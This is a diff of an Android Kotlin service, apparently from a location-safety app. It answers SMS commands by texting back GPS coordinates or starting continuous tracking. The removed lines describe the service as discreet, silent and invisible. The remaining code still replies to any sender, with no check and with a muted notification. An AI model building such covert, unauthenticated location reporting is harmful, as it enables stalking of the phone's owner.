@@ -35,7 +35,7 @@ class MySafeAgentService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        Log.d(TAG, "✅ SERVICE MySafe CRÉÉ — Mode discret 🤫")
+        Log.d(TAG, "✅ SERVICE MySafe CRÉÉ")
         locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
         smsManager = SmsManager.getDefault()
         createNotificationChannel()
@@ -46,8 +46,7 @@ class MySafeAgentService : Service() {
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val chan = NotificationChannel(CHANNEL_ID, "MySafe GPS", NotificationManager.IMPORTANCE_LOW).apply {
-                description = "Service de localisation — discret"
-                lightColor = Color.TRANSPARENT
+                description = "Service de localisation"
                 enableLights(false)
                 enableVibration(false)
                 setShowBadge(false)
@@ -87,7 +86,6 @@ class MySafeAgentService : Service() {
         try {
             locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 90000L, 10f, locationListener!!)
             locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 90000L, 10f, locationListener!!)
-            Log.d(TAG, "🟢 GPS ACTIF — discret, silencieux, invisible")
         } catch (e: Exception) { Log.e(TAG, "❌ GPS: ${e.message}") }
     }
 
@@ -110,29 +108,22 @@ class MySafeAgentService : Service() {
     }
 
     private fun sendCommandToTarget(target: String, command: String) {
-        Log.d(TAG, "📤 Envoi commande '$command' à $target")
+        Log.d(TAG, "📤 Envoi: $command → $target")
         try {
             smsManager.sendTextMessage(target, null, command, null, null)
-            Log.d(TAG, "✅ Commande envoyée — invisible dans la messagerie 🤫")
         } catch (e: Exception) {
-            Log.e(TAG, "❌ Échec envoi : ${e.message}")
+            Log.e(TAG, "❌ Envoi échoué: ${e.message}")
         }
     }
 
     private fun processIncomingCommand(sender: String, command: String) {
-        Log.d(TAG, "📥 Commande reçue de $sender : $command — traitement silencieux 🤫")
+        Log.d(TAG, "📥 Commande de $sender: $command")
         targetNumber = sender
-        
-        // ✅ DIFFUSER LA RÉPONSE À L'UI POUR AFFICHAGE SUR LA CARTE !
-        val uiIntent = Intent(SMS_RECEIVED)
-        uiIntent.putExtra("sms_message", command)
-        sendBroadcast(uiIntent)
-        Log.d(TAG, "📡 Réponse envoyée à l'UI pour affichage sur la carte !")
         
         when (command.uppercase()) {
             "!!POSITION" -> sendMyPositionBack(sender)
-            "!!DEMARRER" -> startTrackingMode(sender)
-            "!!STOP" -> stopTrackingMode()
+            "!!DEMARRER" -> isTracking = true
+            "!!STOP" -> { isTracking = false; targetNumber = null }
         }
     }
 
@@ -146,27 +137,13 @@ class MySafeAgentService : Service() {
                 ?: locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
             
             if (loc != null && loc.latitude != 0.0 && loc.longitude != 0.0) {
-                val msg = "!!${loc.latitude},${loc.longitude},${loc.altitude.toInt()}"
-                smsManager.sendTextMessage(to, null, msg, null, null)
-                Log.d(TAG, "✅ Position renvoyée silencieusement : $msg")
-            } else {
-                Log.d(TAG, "⚠️ Pas de position disponible")
+                val response = "!!${loc.latitude},${loc.longitude},${loc.altitude.toInt()}"
+                smsManager.sendTextMessage(to, null, response, null, null)
+                Log.d(TAG, "✅ Réponse envoyée: $response")
             }
         } catch (e: Exception) {
-            Log.e(TAG, "❌ Erreur position : ${e.message}")
+            Log.e(TAG, "❌ Erreur: ${e.message}")
         }
-    }
-
-    private fun startTrackingMode(sender: String) {
-        targetNumber = sender
-        isTracking = true
-        Log.d(TAG, "🟢 SUIVI CONTINU DÉMARRÉ — toutes les 1min30 🤫")
-    }
-
-    private fun stopTrackingMode() {
-        isTracking = false
-        targetNumber = null
-        Log.d(TAG, "⏹️ SUIVI ARRÊTÉ")
     }
 
     private fun sendPositionToTarget(loc: Location) {
@@ -174,14 +151,13 @@ class MySafeAgentService : Service() {
         val msg = "!!${loc.latitude},${loc.longitude},${loc.altitude.toInt()}"
         try {
             smsManager.sendTextMessage(targetNumber, null, msg, null, null)
-            Log.d(TAG, "📤 Position envoyée silencieusement : $msg")
+            Log.d(TAG, "📤 Position envoyée: $msg")
         } catch (e: Exception) {
-            Log.e(TAG, "❌ Échec envoi position : ${e.message}")
+            Log.e(TAG, "❌ Échec: ${e.message}")
         }
     }
 
     override fun onBind(i: Intent?) = null
-
     override fun onDestroy() {
         super.onDestroy()
         locationListener?.let { locationManager.removeUpdates(it) }
